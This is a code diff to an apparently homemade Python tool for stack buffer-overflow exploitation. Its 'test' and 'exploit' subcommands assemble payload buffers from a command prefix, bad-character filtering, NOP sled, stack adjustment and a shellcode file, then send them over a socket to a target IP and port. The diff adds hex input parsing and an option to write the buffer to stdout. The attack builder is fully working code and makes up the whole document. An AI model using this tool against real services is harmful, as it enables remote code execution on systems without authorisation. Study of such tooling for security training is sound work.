@@ -20,6 +20,7 @@ test_parser.add_argument('--buffer-type',type=str,choices=['a','pattern','confir
 test_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
 test_parser.add_argument('-b',type=str,help='badchars to exclude from buffer seperated by commas (in integer form)')
 test_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')
+test_parser.add_argument('--stdout',action='store_true',help='send buffer to stdout instead of socket')
 
 exploit_parser = _subparsers.add_parser('exploit',help='options for exploit')
 exploit_parser.add_argument('ip',type=str,help='ip of remote target')
@@ -33,6 +34,7 @@ exploit_parser.add_argument('--sub_esp',type=int,help='integer value to (1-9) of
 exploit_parser.add_argument('--nops',type=int,help='number of nops to place before shellcode')
 exploit_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
 exploit_parser.add_argument('--post_command',type=str,help='server command to append buffer with (remember to escape backslashes)')
+exploit_parser.add_argument('--stdout',action='store_true',help='send buffer to stdout instead of socket')
 
 
 query_parser = _subparsers.add_parser('q',help='query for offsets')
@@ -44,12 +46,15 @@ sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 
 if __name__ == '__main__':
-	print(args)
+	#print(args)
 	if(args.cmdlet=='test'):
-		print('test')
+		#print('test')
 
 		if(args.command != None):
-			buffer = args.command.encode()
+			if(args.command[0:2]=='0x'):
+				buffer = bytes.fromhex(args.command.strip('0x'))
+			else:
+				buffer = args.command.encode()
 		else:
 			buffer = b''
 
@@ -78,21 +83,27 @@ if __name__ == '__main__':
 
 
 		if(args.post_command != None):
-			args.post_command=args.post_command.replace('\\n','\n')
-			args.post_command=args.post_command.replace('\\r','\r')
-			buffer+=args.post_command.encode()
+			if(args.post_command[0:2]=='0x'):
+				buffer+=bytes.fromhex(args.post_command.strip('0x'))
+			else:
+				args.post_command=args.post_command.replace('\\n','\n')
+				args.post_command=args.post_command.replace('\\r','\r')
+				buffer+=args.post_command.encode()
 
-		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
-		try:
-			sock.connect((args.ip,args.port))
-			sock.send(buffer)
-			sock.close()
-			print('\n successfully sent buffer of length:{}'.format(len(buffer)))
-		except ConnectionRefusedError:
-			print('\nconnection refused, check IP and PORT')
+		if(args.stdout == True):
+			sys.stdout.buffer.write(buffer)
+		else:
+			print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
+			try:
+				sock.connect((args.ip,args.port))
+				sock.send(buffer)
+				sock.close()
+				print('\n successfully sent buffer of length:{}'.format(len(buffer)))
+			except ConnectionRefusedError:
+				print('\nconnection refused, check IP and PORT')
 
 	elif(args.cmdlet=='exploit'):
-		print('exploit')
+		#print('exploit')
 
 		stack_adjust = b'\x81\xec\x00'
 		zeros = b'\x00\x00'
@@ -112,7 +123,10 @@ if __name__ == '__main__':
 		if(args.command==None):
 			buffer = b''
 		else:
-			buffer = args.command.encode()
+			if(args.command[0:2]=='0x'):
+				buffer = bytes.fromhex(args.command.strip('0x'))
+			else:
+				buffer = args.command.encode()
 
 		#check shellcode
 		if(not os.path.isfile(args.shellcode)):
@@ -149,19 +163,24 @@ if __name__ == '__main__':
 			sys.exit(1)
 
 		if(args.post_command != None):
-			args.post_command=args.post_command.replace('\\n','\n')
-			args.post_command=args.post_command.replace('\\r','\r')
-			buffer+=args.post_command.encode()
+			if(args.post_command[0:2]=='0x'):
+				buffer+=bytes.fromhex(args.post_command.strip('0x'))
+			else:
+				args.post_command=args.post_command.replace('\\n','\n')
+				args.post_command=args.post_command.replace('\\r','\r')
+				buffer+=args.post_command.encode()
 
-		print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
-
-		try:
-			sock.connect((args.ip,args.port))
-			sock.send(buffer)
-			sock.close()
-			print('\n successfully sent buffer of length:{}'.format(len(buffer)))
-		except ConnectionRefusedError:
-			print('\nconnection refused, check IP and PORT')
+		if(args.stdout==True):
+			sys.stdout.buffer.write(buffer)
+		else:
+			print('prepared buffer is:{0}...{1}'.format(buffer[0:10],buffer[len(buffer)-10:-1]))
+			try:
+				sock.connect((args.ip,args.port))
+				sock.send(buffer)
+				sock.close()
+				print('\n successfully sent buffer of length:{}'.format(len(buffer)))
+			except ConnectionRefusedError:
+				print('\nconnection refused, check IP and PORT')
 
 	elif(args.cmdlet=='q'):
 		print('query to be implemented')
